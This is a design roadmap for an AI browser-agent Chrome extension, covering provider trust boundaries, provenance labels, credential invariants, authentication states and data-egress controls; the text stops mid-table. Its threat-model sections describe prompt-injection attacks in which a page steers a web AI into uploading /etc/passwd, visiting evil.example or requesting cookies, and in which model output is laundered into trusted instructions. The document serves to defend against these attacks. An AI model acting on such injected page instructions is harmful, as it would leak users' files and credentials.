# Stage 3 Product Roadmap

**Status:** planning only. Nothing in this document has been implemented, and
nothing in it changes the Stage 2 baseline. It records analysis, dependencies
and open questions so that implementation, when it is authorised, starts from
evidence rather than from assumption.

Where this document and
[the specification](../spec/AI_Browser_Agent_Specs_Kit_v1.1_Unbranded.md)
disagree, the specification wins. Section references (§) point into it.

---

## 1. Current Stage 2 Baseline

| Item                                | Value                                                    |
| ----------------------------------- | -------------------------------------------------------- |
| Repository                          | `jamalbalya/aibrowseragent`                              |
| Default branch                      | `main` (only branch)                                     |
| Stage 2                             | PASS — see `docs/stage-2-status.md`                      |
| Overall capability parity           | PARTIAL — see `PARITY_MATRIX.md`                         |
| Baseline commit                     | `5bc3925402f754e3c50c935b07df403409ad5e50`               |
| CI                                  | run 35584968053 — Verify, Dependency audit, E2E all pass |
| Unit / Integration / Security / E2E | 323 / 74 / 213 / 49, zero skipped, zero failed           |

Stage 2 covers specification Phases 1–4 plus the OpenAI-compatible adapter from
Phase 5. It is frozen. This roadmap does not modify it.

---

## 2. Final Product Vision

The end state is a Chrome extension an ordinary person installs through a
supported Chrome distribution channel — not Developer Mode, not "load
unpacked", not a repository clone — and uses as a browser agent driven by an AI
model they choose.

Two integration models are in scope, and they are **separate security
domains** that must never be merged:

1. **API providers** — the agent talks to an official API using a credential
   the user configured.
2. **Authenticated AI web providers** — the agent interacts with an AI web
   application in a tab the user is already logged into.

A web login is not an API credential. An API credential is not a web session.
No mechanism may convert one into the other (§3.3).

---

## 3. API Provider Architecture

```text
Agent runtime → ProviderRegistry → AIProviderAdapter → official API → provider
```

This exists today and is validated: `ProviderRegistry` enforces explicit
switching with no silent fallback (§60), `AIProviderAdapter` is the
provider-neutral contract (§12, §13, §47, §69), and the capability doctor
reports `AGENT_READY` / `CONNECTED_LIMITED` / `CHAT_ONLY` / `FAILED` rather
than assuming capability (§14).

Remaining API-side work is Phase 5: Anthropic, Gemini and a generic
compatible adapter, all behind the same canonical tool surface, plus §87
acceptance per provider (connect, validate, list models, generation,
streaming, tool calling, multiple tool calls, vision, invalid credentials,
expired auth, rate limit, unsupported capability).

---

## 4. Authenticated AI Web Provider Architecture

```text
Agent runtime → ProviderRegistry → WebProviderAdapter → browser tab
              → AI web application → user's existing browser session
```

**Gate outcome: the architecture is IMPLEMENTABLE; production enablement of
consumer-web inference is REQUIRES LEGAL/TERMS REVIEW and is additionally
BLOCKED by §3.3 as written.** See §4A for the evidence. The three findings
below are what the gate pass examined.

### 4.1 The specification restricts what a web session may be used for

§3.3 requires provider authentication to use "only provider-approved methods"
and forbids the project from bypassing "subscription/API boundaries" or
claiming "that a consumer subscription automatically grants API access". §15
adds, for one named provider, "Do not assume a ChatGPT subscription provides
API access" and "Do not scrape ChatGPT session cookies or undocumented
endpoints". §3.3 closes with: _a user identity is not the same as model/API
entitlement_.

Driving a consumer AI web UI so that it answers the agent's prompts uses a
consumer subscription in the place of API entitlement. It does so without
stealing a cookie and without touching an undocumented endpoint — so it is not
the mechanism §15 names — but it is plausibly the outcome §3.3 forbids. This
document does not resolve that. **It is question Q1 in §26 and needs the
owner's decision, per provider, before implementation.**

### 4.2 §42 points browser automation at task sites, not at the model

§42 distinguishes a browser session (the user is logged into a website) from
connector authentication, and says to use browser automation when "the API does
not expose the required operation", "UI verification is required", or "the task
explicitly requires UI". It frames browser automation as how the agent operates
**target** websites. Using a browser session to obtain **model inference** is a
different role and is not described in the specification at all.

### 4.3 The trust model inverts, and this is a real security problem

Today every byte read from a page is untrusted: the content script wraps it in
a data envelope, `scanForInjection` runs over it, and `wrapUntrusted` marks it
so the model cannot be steered by page text. That is the core Phase 4 control.

If the model's own reply arrives as page content, the same pipeline is asked to
treat model output as untrusted page text — and the agent then acts on it. The
consequences need design work before any code:

- A prompt-injection payload on an unrelated site could reach the AI web app's
  conversation and come back looking like a model instruction.
- Redaction runs on page reads; a model reply read from the DOM would be
  redacted like page content, which may corrupt legitimate output.
- Evidence provenance changes: a DOM-read model answer is `SCREENSHOT`/`DOM`
  evidence, not a provider response, and the audit trail must say so.

**No web provider should be implemented until the trust boundary for model
output read from a DOM is designed and reviewed.** This is question Q2.

---

## 4A. Web AI Provider Gate Closure

A second gate pass re-read the specification and re-attempted first-party
provider sources. It produced one correction to the previous pass and one
verdict.

### Correction to the previous gate report

The previous pass concluded that consumer-web inference was "BLOCKED by §3.3 as
written", reasoning that it "is not among the four enumerated methods". That
over-read the list. §3.3 says:

> Authentication must support only provider-approved methods.
>
> **Possible methods include:** API key; OAuth/account authorization where
> officially supported; provider-specific authorization mechanisms; compatible
> endpoint credentials.

"Possible methods **include**" is non-exhaustive. §3.3 therefore does **not**
categorically exclude an unlisted method. The operative constraint is the
first sentence: the method must be **provider-approved**. That converts the
question from a specification question into a per-provider terms question —
which this environment cannot answer.

### Three concepts, held apart

|       | Concept                                                                                                                   | The website's role                        | Status                                   |
| ----- | ------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------- | ---------------------------------------- |
| **A** | Normal browser automation — navigate, read, click, type, submit, extract                                                  | the task target                           | **Implemented and validated in Stage 2** |
| **B** | Authenticated AI website as a website — detect provider and auth state via permitted signals                              | a site the user happens to be logged into | **Implementable**; no inference involved |
| **C** | Web AI as model inference — send a prompt to a consumer AI site, read the reply from the DOM, feed it to the agent's loop | the agent's _brain_                       | **Gated**                                |

Permission for A or B does not authorise C. C is the only disputed capability,
and it is disputed on terms grounds, not on engineering grounds.

### Specification compatibility verdict

**AMBIGUOUS — OWNER DECISION REQUIRED.**

| Section       | Bearing on C                                                                                                                                                                                                                                                                                                                                                                                       |
| ------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| §3.3          | Non-exhaustive list; operative test is "provider-approved". Does not categorically forbid C. Its prohibitions — cookie theft, token extraction, scraping undocumented APIs, impersonation — are **not** what C does. "Bypass subscription/API boundaries" and "a user identity is not the same as model/API entitlement" do reach C's _effect_, and are the strongest textual argument against it. |
| §15           | Forbids assuming a consumer subscription grants API access, and forbids scraping session cookies or undocumented endpoints. C does none of these. §15 neither authorises nor forbids C.                                                                                                                                                                                                            |
| §42           | Frames browser automation as operating **target** sites. Using a browser session for inference is a role the specification never describes — an omission, not a prohibition.                                                                                                                                                                                                                       |
| §30           | Governs how C's _output_ must be treated, not whether C may exist. See §4B.                                                                                                                                                                                                                                                                                                                        |
| §85 F, §87    | Provider acceptance is written entirely in API terms — connect, list models, streaming, tool calling, invalid credentials, rate limit. A web UI has no surface to assert most of these against, so C can never satisfy §87. **C cannot contribute to parity certification.**                                                                                                                       |
| §83, §84, §99 | C is not among P-001…P-040. It neither helps nor blocks certification.                                                                                                                                                                                                                                                                                                                             |

The specification is **silent on C, restrictive in spirit, and explicitly
conditional on provider approval**. It does not resolve itself.

### Provider policy matrix

Every first-party domain is blocked by this environment's egress proxy:
`openai.com`, `www.anthropic.com`, `policies.google.com`,
`www.perplexity.ai`, `developer.chrome.com` — all returned `EGRESS_BLOCKED`.
**No provider term was read verbatim.** Search-engine summaries were obtainable
and are recorded as indications only; per the task rules they are not converted
into policy conclusions.

Capabilities evaluated separately, never collapsed:

| #   | Capability                                        | OpenAI                                                            | Anthropic  | Google     | Perplexity |
| --- | ------------------------------------------------- | ----------------------------------------------------------------- | ---------- | ---------- | ---------- |
| 1   | Browser automation of the site (A)                | UNVERIFIED                                                        | UNVERIFIED | UNVERIFIED | UNVERIFIED |
| 2   | Use of an authenticated browser session (B)       | UNVERIFIED                                                        | UNVERIFIED | UNVERIFIED | UNVERIFIED |
| 3   | Automated model inference via consumer web UI (C) | **REQUIRES LEGAL REVIEW** — adverse indication                    | UNVERIFIED | UNVERIFIED | UNVERIFIED |
| 4   | Automated extraction of model output              | **REQUIRES LEGAL REVIEW** — adverse indication                    | UNVERIFIED | UNVERIFIED | UNVERIFIED |
| 5   | Credential / session extraction                   | **Prohibited by this project** regardless of any provider's terms | same       | same       | same       |
| 6   | Circumventing access controls                     | **Prohibited by this project**                                    | same       | same       | same       |
| 7   | Bypassing CAPTCHA / MFA / SSO                     | **Prohibited by this project**                                    | same       | same       | same       |
| 8   | Official API available as alternative             | Yes                                                               | Yes        | Yes        | Yes        |

Rows 5–7 are project invariants, not findings — they need no provider term to
be settled and are closed permanently.

The OpenAI "adverse indication" is a search-derived summary attributed to
`openai.com/policies/*` reporting that the terms prohibit automatically or
programmatically extracting data or Output from the services. **Source to
verify:** OpenAI Terms of Use / Service Terms, `openai.com/policies/`. It is
recorded as an indication because it was not read.

**Every row 1–4 needs verification from an environment with egress to those
domains before C can move.**

### Architecture decision

Web AI providers should be **a separate provider class with stronger trust
restrictions** — not API-equivalent, and not merely browser-automation targets.

Not API-equivalent: an API adapter returns a `CanonicalResponse` carrying
structured `toolCalls`; a DOM read returns prose. Treating them as peers would
require parsing prose into tool calls, which manufactures an instruction
channel out of §30-untrusted content. It would also mean §87 acceptance could
never pass for that class.

Not merely a browser target: a browser target's content never reaches the
planner as a proposal at all, and the product goal needs the reply to inform
the task.

So: a third class, whose output is admitted as **data** and whose capability
set honestly declares no tool calling and no streaming.

---

## 4B. Provenance Model and the Model-Output Trust Boundary (Q2)

### The answer, and where it comes from

§30 enumerates untrusted external content and the list includes `web pages` and
`screenshots`. Model output rendered into a web application's DOM **is**
web-page content. The specification therefore already answers Q2:

> Model output obtained from a web UI is untrusted external content. It is
> data. It is never instructions.

This is not a conservative choice made here; it is what §30 says. And it is
correct on the merits: text in an AI web app's transcript may have been placed
there by an earlier injection, by another page the agent read, by a shared
conversation, or by the user. "It came from an AI provider" is not a property
the DOM can attest to.

### Provenance labels

§30 lists "origin tagging" and "trust classification" among required defenses,
so provenance labels are a specification requirement. The set that the
architecture needs, and what each one licenses:

| Label                     | Trust               | Instructions?  | Enters planner? | Tool proposals? | Authorises?                           | Affects policy/permissions?                           | Evidence?            |
| ------------------------- | ------------------- | -------------- | --------------- | --------------- | ------------------------------------- | ----------------------------------------------------- | -------------------- |
| `SYSTEM_CONTROLLED_DATA`  | trusted             | Yes            | Yes             | Yes             | Yes                                   | Yes                                                   | Yes                  |
| `USER_INPUT`              | trusted-as-intent   | Yes, as intent | Yes             | Yes             | Yes                                   | No — the user authorises actions, not policy rewrites | Yes                  |
| `MODEL_OUTPUT_API`        | semi-trusted        | Proposals only | Yes             | Yes, structured | **No** — the policy engine authorises | **No**                                                | Yes                  |
| `MODEL_OUTPUT_WEB_UI`     | **untrusted** (§30) | **No**         | Yes, as data    | **No**          | **No**                                | **No**                                                | Yes, with provenance |
| `WEB_PAGE_CONTENT`        | **untrusted** (§30) | **No**         | Yes, as data    | **No**          | **No**                                | **No**                                                | Yes                  |
| `TOOL_RESULT`             | classified per tool | No             | Yes             | No              | No                                    | No                                                    | Yes                  |
| `EXTENSION_INTERNAL_DATA` | trusted             | Yes            | Yes             | No              | No                                    | Yes                                                   | Yes                  |

### Preventing provenance laundering

The attack to design against:

```text
WEB_PAGE_CONTENT (malicious)  ->  pasted into the AI web UI
                              ->  model repeats it
                              ->  read back as MODEL_OUTPUT_WEB_UI
                              ->  treated as a trusted planner instruction
```

Two properties block it, and both must hold:

1. **`MODEL_OUTPUT_WEB_UI` is never more trusted than `WEB_PAGE_CONTENT`.**
   Both sit at the same level, so the laundering step has nowhere to land.
   Round-tripping through a model is not a trust-raising operation.
2. **Provenance is assigned at admission and is immutable.** It is set by the
   boundary that first admits the bytes and cannot be reassigned downstream.
   Any component able to relabel content would itself be a laundering device.

A corollary that is easy to get wrong: content the _agent itself_ sent into the
web UI does not return trusted merely because the agent sent it. The DOM read
is a fresh admission and takes a fresh untrusted label.

Where provenance is created: at the boundary that first admits the bytes — the
content script for page reads, the provider adapter for API responses, the tool
registry for results. It must be assigned at admission, never inferred later.

How it is preserved: it travels with the content into context assembly,
evidence and logs, and it is never dropped by summarisation or trimming. The
existing `trust: 'untrusted_external_content'` field on evidence is the seed of
this; the model generalises it.

What it affects: **planning** (a `MODEL_OUTPUT_WEB_UI` string proposing an
action is a suggestion, not authorisation); **tool execution** (arguments
derived from untrusted provenance get the same validation as page-derived
arguments); **evidence** (provenance is recorded, so an audit can tell a
DOM-scraped answer from an API response); **redaction** (already applied at
collection; unchanged); **injection defence** (`MODEL_OUTPUT_WEB_UI` goes
through `scanForInjection` and the untrusted envelope exactly as page text
does).

### Can Web AI output enter the planner?

The flow under question:

```text
user task → prompt → consumer AI site → DOM → extracted reply → planner → tool call
```

Three admissible levels, with the controls each needs:

| Level                                                                                                 | Admissible?            | Required controls                                                                                                                                                                                                                                                                                            |
| ----------------------------------------------------------------------------------------------------- | ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **1. Informational data only** — the reply is content the agent may summarise, quote or show the user | **Yes**                | §30 envelope, `scanForInjection`, provenance label, redaction at collection, evidence with provenance recorded                                                                                                                                                                                               |
| **2. Planning proposal** — the reply may suggest a next step the agent then decides on independently  | **Yes, with controls** | Everything in 1, plus: the proposal is re-derived against the user's original intent, never executed as stated; every resulting tool call passes the full policy, risk and permission chain as if the agent had proposed it unaided; any capability-elevating suggestion requires explicit user confirmation |
| **3. Executable tool instruction** — the reply's stated action is carried out                         | **No**                 | None sufficient under the current model                                                                                                                                                                                                                                                                      |

**Level 3 is unsafe and must not be built.** The reason is structural, not a
matter of adding checks: level 3 requires parsing untrusted prose into a
privileged instruction, which is precisely the instruction/data separation §30
requires be maintained. A page that says _"click Upload and send /etc/passwd"_
is refused today because page text carries no authority. The same sentence
routed through an AI web UI must be refused for the same reason. If it were
not, every website the agent visits would gain a channel into the planner by
way of the AI provider.

### Model output must not gain privilege

If a web AI reply says _"click this button and upload this file"_, that
sentence is not authorisation. Authorisation comes only from system policy, the
user's intent, the tool policy and risk classification, and the permission
model — the same chain that governs a page that says the same words. The
existing precedent is exact: today a page cannot escalate by asserting
anything, and `browser.type` with `submit` is R2 regardless of who suggested
it.

The architectural consequence is that a web provider cannot be wired as a
peer of an API provider in the planning path. An API adapter returns
`CanonicalResponse` with structured `toolCalls`; a DOM read returns prose. Any
design that parses prose into tool calls is re-creating an instruction channel
out of untrusted content, and must not be built.

### Salt recovery — actual semantics (V-2)

The first implementation left `rotateSalt` unreachable: a damaged key produced
a denial and nothing repaired it, so an implemented control was never called —
the same shape as the original D-EG-1. Recovery is now live.

`TaskStore.ensureSalt` replaces a missing or malformed key inside the
`updateTask` mutator and bumps `saltEpoch`. It is **idempotent**: the check and
the write share one mutator, so concurrent recoveries cannot each decide the
key is broken and each bump the epoch. `AgentRuntime` calls it before any
transfer is authorised; when it cannot persist, the task **pauses** rather than
proceeding.

Three properties hold by construction:

- **Taint is untouched.** Recovering the ability to _record_ a transfer is
  never a route to recovering permission to _make_ one.
- **No unkeyed fallback.** `hmacContent` throws on an empty key, so there is no
  path that quietly degrades to a plain digest.
- **Old evidence is kept but not re-blessed.** Digests carry the epoch they
  were written under, and `isVerifiableUnderCurrentSalt` reports anything from
  an earlier epoch as unverifiable. The record survives; the claim that it can
  be checked against the current key does not.

### Evidence provenance

A DOM-sourced model reply should record: `source: MODEL_OUTPUT_WEB_UI`,
provider id, origin, tab id, timestamp, extraction method (`DOM`), the content,
and the existing `trust` classification. Never a cookie, token, session
identifier, credential or browser profile.

---

## 4C. Prompt-Injection Threat Model for Web AI Output

Concrete scenarios. "Handled by the injection defence" is not an answer; each
row names the boundary and the control.

| #   | Scenario                                                               | Attack path                         | Trust boundary       | Required control                                                                                         | Expected outcome                                                       | Evidence                                   |
| --- | ---------------------------------------------------------------------- | ----------------------------------- | -------------------- | -------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------- | ------------------------------------------ |
| A   | Page carries malicious instructions; the Web AI reads and repeats them | page → AI UI → DOM → planner        | DOM admission        | Both hops labelled untrusted; no trust rise on round-trip                                                | Repeated text is data; no action follows from it                       | Both admissions recorded with provenance   |
| B   | Page asks the Web AI to upload local files                             | page → AI UI → "upload /etc/passwd" | tool authorisation   | Level-3 execution prohibited; upload is a consent-gated tool; `file:` blocked at scheme gate             | Refused at the scheme gate before any tool runs                        | Refusal with reason and origin             |
| C   | Page asks the Web AI to navigate to an attacker domain                 | page → AI UI → "go to evil.example" | origin + policy      | Navigation classified on its destination, re-validated at execution; suggestion carries no authority     | Treated as a fresh R1 navigation subject to policy, not an instruction | Destination and decision recorded          |
| D   | Web AI reply says to disable security controls                         | DOM → planner → policy              | policy immutability  | `MODEL_OUTPUT_WEB_UI` cannot affect policy or permissions (provenance table)                             | No policy path exists to change; refused                               | Attempt recorded                           |
| E   | Web AI reply asks for cookies / tokens / passwords                     | DOM → planner → credential access   | credential invariant | No tool exposes credentials; invariants below are absolute                                               | Impossible — no such capability exists to invoke                       | Attempt recorded as a security event       |
| F   | Web AI reply attempts to invoke a high-risk tool                       | DOM → planner → R2/R3 tool          | risk + permission    | Untrusted provenance cannot originate a tool proposal; any resulting call is re-classified and confirmed | Blocked, or escalated to explicit user confirmation                    | Risk level and decision recorded           |
| G   | Web AI reply attempts a destructive action                             | DOM → planner → prohibited action   | hard prohibition     | Hard prohibitions hold in every mode, including skip                                                     | Denied unconditionally                                                 | Denial recorded with the prohibition cited |

The common structure: **untrusted provenance cannot originate a tool proposal**,
so every scenario collapses to "the agent may read this, and must decide
independently". That single property does most of the work, which is why it is
the one that must not be compromised for convenience.

---

## 4D. Credential and Session Invariants

Absolute, not configurable, and true regardless of any provider's terms. The
extension must never: read passwords or browser password stores; read
authentication cookies; extract session tokens, OAuth tokens, or API keys from
provider sessions; convert a consumer web session into API credentials; bypass
MFA, CAPTCHA, SSO or any provider access control; or store provider session
secrets.

### Signals permitted for authentication detection

The question "what may be used without inspecting secrets" has a precise
answer: only what an ordinary content script may observe about rendering.

| Permitted                                                      | Not permitted                                             |
| -------------------------------------------------------------- | --------------------------------------------------------- |
| The tab's URL and origin                                       | `chrome.cookies` or any cookie read                       |
| Navigation outcome — whether a request landed on a login route | `document.cookie`                                         |
| Visible page state through the existing content script         | `localStorage` / `sessionStorage` / IndexedDB token reads |
| Presence or absence of a login affordance in the rendered DOM  | Authorization headers on the site's own requests          |
| HTTP status of the top-level navigation                        | Any header or body of the site's authenticated API calls  |
| Explicit user statement of which account to use                | Inferring identity from any stored secret                 |

Every permitted signal is an observation about _what the page shows_, never
about _what the session holds_. That line is what keeps detection on the right
side of the invariants — and it is also why detection is at best partially
reliable, since a provider can restyle a login prompt at any time.

### Human-in-the-loop flow

```text
provider needed -> observe state -> AUTHENTICATION_REQUIRED
   -> task PAUSES, user told which provider needs a login
   -> user authenticates themselves, by any method the provider requires
   -> agent observes READY -> task resumes
```

The extension never types a credential, never handles an MFA code, and never
completes a CAPTCHA.

---

## 4E. Authentication State Machine

Minimal set — each state exists because the agent must behave differently in
it. Applies to both provider kinds; API providers simply never reach the
browser-specific states.

| State                     | Entry                                                     | Exit                                          | Trigger                      | Timeout                                                                           | User action                                                        |
| ------------------------- | --------------------------------------------------------- | --------------------------------------------- | ---------------------------- | --------------------------------------------------------------------------------- | ------------------------------------------------------------------ |
| `UNSUPPORTED`             | provider known, cannot be driven safely or reliably       | configuration change                          | registry decision            | n/a                                                                               | choose another provider                                            |
| `NOT_CONFIGURED`          | no provider selected                                      | user selects one                              | user                         | n/a                                                                               | select a provider                                                  |
| `UNKNOWN`                 | configured, not yet observed                              | first observation                             | task start or explicit check | n/a                                                                               | none                                                               |
| `AUTHENTICATION_REQUIRED` | observed unauthenticated                                  | user authenticates, or task cancelled         | observation                  | **none** — waiting on a human must not time out                                   | authenticate                                                       |
| `AUTHENTICATING`          | user began a login                                        | `READY`, or back to `AUTHENTICATION_REQUIRED` | navigation or DOM change     | long, generous; expiry returns to `AUTHENTICATION_REQUIRED`, never fails the task | complete the login                                                 |
| `READY`                   | observed authenticated and usable                         | expiry, denial, unavailability                | observation                  | n/a                                                                               | none                                                               |
| `SESSION_EXPIRED`         | was `READY`, now not, **mid-task**                        | re-authentication                             | observation                  | none                                                                              | re-authenticate; partial work is preserved                         |
| `ACCESS_DENIED`           | authenticated but not entitled — plan, region, org policy | configuration change                          | provider response            | n/a                                                                               | **retrying the login will not help**; must be distinct from expiry |
| `PROVIDER_UNAVAILABLE`    | reachable but erroring, or offline                        | recovery                                      | error or timeout             | short, retryable                                                                  | retry or switch                                                    |

`AUTHENTICATED` is deliberately absent: it would be indistinguishable from
`READY` in behaviour, and authenticated-but-unusable is `ACCESS_DENIED`. A state
with no distinct behaviour cannot be tested and should not exist.

Failure behaviour throughout: the task **pauses**, never silently fails, and
never retries a login on the user's behalf.

---

## 4F. Tool Authorization Boundary — verified against the implementation

Dispatch order in `src/tools/registry/tool-registry.ts`, which every tool call
passes through: **(1)** schema validation — _"Model output never reaches an
implementation raw"_; **(2)** argument-aware classification, where a tool may
raise its own risk but never lower the declared floor; **(3)** policy;
**(4)** permission; **(5)** bounded execution; **(6)** sanitisation before the
result re-enters model context.

Web AI output would enter at the **top** of this pipeline, as arguments to a
proposed call — the same entry point model output already uses. It therefore
cannot bypass risk classification (step 2), permission (step 4), origin
validation (`requireTab` inside each tool), the debugger allowlist
(`ALLOWED_CDP_METHODS`), redaction (step 6 and collection-time), or
confirmation. It has no path to change policy: `loadPolicyContext` is read from
storage, not from tool arguments.

Tests already covering these: `tool-registry.test.ts` (invalid arguments never
reach an implementation; a denied call never executes; raw exception text does
not reach the model), `policy-engine.test.ts` (each stage only tightens;
prohibitions hold in every mode), `security.spec.ts` (unknown tools refused;
malformed arguments rejected before anything runs; hard prohibition denied in
skip mode).

**One gap found, and it is material.**

Taint already exists and works: tools emit `TaintSource` records
(`web_page`, `page_html`, `browser_console`, `browser_network`), the runtime
accumulates them across a task (`agent-runtime.ts` — `taint` carries forward
and each dispatch appends), and policy passes them to `evaluateExfiltration`,
which blocks credential-shaped payloads and escalates cross-site movement of
private data.

But `evaluateExfiltration` runs **only when a tool's `classify()` returns a
`writeDestination`**, and **no shipping tool sets one**. The guard is plumbed,
unit-tested in isolation, and never triggered in production — because nothing
currently writes data outward. Equally, **the AI provider request is not
modelled as a destination at all**: tainted page content flows into provider
context by design, with no outbound evaluation.

That is acceptable today and becomes load-bearing the moment a provider is a
_website_. Sending a prompt into a third-party page is unambiguously an
outbound write to an origin, and would be the first capability in this codebase
to require `writeDestination`. Required future change, **not implemented**:
provider-bound content must declare a destination so the existing guard fires,
for web providers certainly and for API providers as a deliberate decision.

---

## 4G. Conversation Context Ownership

A genuine omission in the previous roadmap. Three options:

|     | Model                                                                  | Consequence                                                                                                                                                   |
| --- | ---------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| A   | Provider-native only — the provider's own thread is the state          | Breaks on service-worker eviction, browser refresh, multi-tab and switching; the DOM transcript is not durable and not ours; evidence cannot be reconstructed |
| B   | Agent-owned canonical context; the provider is stateless from our side | Survives eviction and restart via existing task persistence; portable across providers; every turn is ours to record and redact                               |
| C   | Both — canonical context plus provider-native continuity               | Two sources of truth that will diverge, and divergence is silent                                                                                              |

**Recommendation: B, agent-owned canonical context.** It is what the codebase
already does for API providers — `CanonicalMessage`/`CanonicalRequest` with
`ContextBuilder` trimming and `TaskStore` persistence — and it is the only
option that survives the MV3 lifecycle the project has already proven it must
survive. A web provider would then be driven as a stateless turn-taker: the
canonical context is rendered into a prompt, sent, and the reply admitted as
untrusted data.

**The DOM transcript must never be treated as canonical state.** It is a
rendering, it can be edited by the page, it disappears on refresh, and
reading it back as authoritative is the laundering path in §4B.

---

## 4H. Privacy, Data Handling, and the Exfiltration Boundary

Architecture requirements, not a privacy policy — that is the owner's to write.

| Data                         | Stored           | Where                         | Sent to API provider | Sent to Web provider          | In evidence               |
| ---------------------------- | ---------------- | ----------------------------- | -------------------- | ----------------------------- | ------------------------- |
| User task text               | Yes              | `chrome.storage.local`        | Yes                  | Would be — requires consent   | Yes                       |
| Page content read            | Yes, as evidence | local, redacted at collection | Yes, by design       | **Requires explicit consent** | Yes                       |
| Provider prompts             | Yes              | local                         | n/a                  | n/a                           | Yes                       |
| Provider responses           | Yes              | local                         | n/a                  | n/a                           | Yes, with provenance      |
| URLs and tab metadata        | Yes              | local                         | Yes                  | Requires consent              | Yes                       |
| Uploaded / downloaded files  | Not implemented  | —                             | —                    | —                             | —                         |
| Logs                         | Yes              | local, redacted               | No                   | No                            | No                        |
| Provider identifiers         | Yes              | local                         | n/a                  | n/a                           | Yes                       |
| Authentication state         | Yes, state only  | local                         | No                   | No                            | State only, never secrets |
| Credentials, cookies, tokens | **Never**        | —                             | **Never**            | **Never**                     | **Never**                 |

Four flows, and they are not equivalent:

| Flow                      | Position                                                                                                                                                                                             |
| ------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Page → API provider       | The agent's core function. Accepted, but should declare a destination so the guard is exercised rather than dormant (§4F)                                                                            |
| Page → Web provider       | Sends user page content into a third-party _website_. **Requires explicit consent and destination evaluation.** Authentication to a site does not imply permission to send it arbitrary browser data |
| Local file → API provider | Upload is unimplemented. Requires per-file consent and file-origin policy before it exists                                                                                                           |
| Local file → Web provider | Same, plus the destination is a site. Highest-risk flow in the plan                                                                                                                                  |

**Minimum boundary to prevent accidental exfiltration:** provider-bound content
declares a `writeDestination`; the existing guard evaluates it against
accumulated taint; cross-site movement of private data escalates to
confirmation; credential-shaped payloads are blocked unconditionally, which the
guard already does.

### Consent model

Reuse the existing risk classification — **do not build a second permission
system**. R0 read-only needs no prompt; R1 changes page state; R2 submits or
writes; R3 always confirms. Mapping: sending page content to a _web_ provider,
uploading a file, and acting inside a user's authenticated AI account are
R2-or-above and consent-gated; sending page content to a configured API
provider is the task the user already authorised; first use of any web provider
is a one-time explicit grant, as site permissions already work.

---

## 4I. Data Egress / Exfiltration Control Closure — PREREQUISITE

A focused review traced the egress path in code rather than from the previous
report. A second, adversarial review then re-traced it and **corrected this
section's own severity claim**. Five defects are recorded below.

> **Correction (B2 design review).** An earlier revision of this section stated
> that all defects were "latent today because nothing writes data outward".
> That was wrong. `AgentRuntime` calls `provider.generate(request)` directly at
> `agent-runtime.ts:175`, and the adapter reaches the network through its own
> injected `fetchImpl` at `openai-compatible.ts:89,166,221,246,270`. Page text,
> page HTML, console, network and screenshot bytes are already sent off-device
> on every task, **and that path is not evaluated by the policy engine at all**.
> Defect 1 is therefore ACTIVE, not latent. Defects 2 and 3 remain latent in
> the sense that no control currently consumes them, but Defect 2 is
> reachable today through the documented PAUSED-then-resume path.

**This section is a hard prerequisite of D4, and of connectors, MCP and plugins.**

### Verified call graph

```text
tool.execute()            emits TaintSource[]          browser-tools.ts:211, debugger-tools.ts:97,178,265
   -> ToolRegistry         result.taint               tool-registry.ts:254,275
   -> AgentRuntime         const taint = [...task.taint]   agent-runtime.ts:123
                           taint.push(...dispatch.taint)   agent-runtime.ts:317
   -> dispatch(taint)      passed per call            agent-runtime.ts:301
   -> evaluatePolicy       taint forwarded            policy-engine.ts:166
   -> evaluateExfiltration ONLY IF writeDestination   policy-engine.ts:162
   -> verdict block        -> DENY EXFILTRATION_BLOCKED   policy-engine.ts:168-175
```

### D-EG-1 — the guard is unreachable in production

`evaluateExfiltration` runs only when a tool's `classify()` returns
`writeDestination` (`policy-engine.ts:162`). **No shipping tool declares one.**
Verified by search across `src/tools/browser`, `src/tools/tabs`,
`src/tools/debugger`: zero occurrences. The guard is implemented and unit-tested
(`exfiltration.test.ts`) but never executes in the product.

### D-EG-2 — accumulated taint is not persisted

`task.taint` is initialised to `[]` at creation (`task-model.ts:211`) and
**never written again anywhere in the codebase** — verified by searching every
assignment to `taint:` in `src/`. Accumulation happens only in a local array
inside `AgentRuntime.run()` (`agent-runtime.ts:123`), which dies with the
service worker. `TaskStore` persists no taint field.

Consequence: after a service-worker eviction, a resumed task's taint is empty.
Every page read before the restart is forgotten, so an egress check on the
resumed task would evaluate it as though nothing sensitive had been read —
a **fail-open on restart**. MV3 evicts workers routinely; this is not an edge
case.

### D-EG-3 — the trust ladder has an elevation slot

`TRUST_LEVELS` (`untrusted-content.ts:13`) ranks, most to least trusted:

```text
system_policy > user_intent > agent_runtime > authenticated_connector
              > authenticated_application > browser_ui > untrusted_external_content
```

`authenticated_application` sits **above** `browser_ui` and
`untrusted_external_content`. A Web AI provider is an authenticated
application, so the obvious implementation maps it to that level — and that
single line would be a trust elevation of DOM-read model output, breaking the
§30 invariant and opening the laundering path in §4B.

**Rule:** a Web AI provider's _output_ is always `untrusted_external_content`,
whatever the provider's authentication state. `authenticated_application` may
describe the _session_, never the _content read from it_.

### Data source inventory (implementation terminology)

| Source                        | Tainted today           | Taint created at            | Survives eviction      |
| ----------------------------- | ----------------------- | --------------------------- | ---------------------- |
| `web_page`                    | Yes                     | `browser-tools.ts:166,211`  | **No** (Defect 2)      |
| `page_html`                   | Yes                     | `debugger-tools.ts:259,265` | **No**                 |
| `browser_console`             | Yes                     | `debugger-tools.ts:91,99`   | **No**                 |
| `browser_network`             | Yes                     | `debugger-tools.ts:180`     | **No**                 |
| Screenshot evidence           | No taint source emitted | —                           | n/a                    |
| `USER_INPUT` (task objective) | No                      | —                           | Persisted as task text |
| `MODEL_OUTPUT_API`            | No                      | —                           | In canonical context   |
| `MODEL_OUTPUT_WEB_UI`         | Does not exist          | —                           | —                      |
| Local / downloaded file       | Not implemented         | —                           | —                      |

Gaps: screenshots carry `trust` on evidence but emit no `TaintSource`, so image
content contributes nothing to sensitivity. Model output of either kind has no
taint representation at all.

### Destination taxonomy (none implemented)

| Destination                             | Data can leave | Consent          | Risk class | Origin validation  | Identity recorded       | Explicit in policy |
